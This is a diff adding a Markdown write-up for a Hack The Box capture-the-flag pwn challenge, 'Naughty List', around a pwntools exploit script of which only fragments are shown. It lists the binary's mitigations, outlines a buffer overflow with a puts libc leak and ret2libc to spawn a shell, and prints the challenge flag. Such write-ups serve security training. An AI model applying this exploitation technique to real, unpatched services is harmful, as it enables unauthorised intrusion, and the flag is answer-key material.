@@ -1,3 +1,28 @@
+# Naughty List
+
+## Challenge
+
+Simple binary with a buffer-overflow.
+
+### Mitigations
+
+```
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+## Solution
+
+We can overflow the buffer and use `puts` to leak the libc address.
+
+Then we can return to the vulnerable function and overflow a second time to ret2libc and spawn an shell.
+
+## Exploit
+
+```py
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
@@ -91,4 +116,8 @@ payload = flat({
 io.sendlineafter(b":", payload)
 
 io.interactive()
+```
 
+## Flag
+
+`HTB{u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft}`
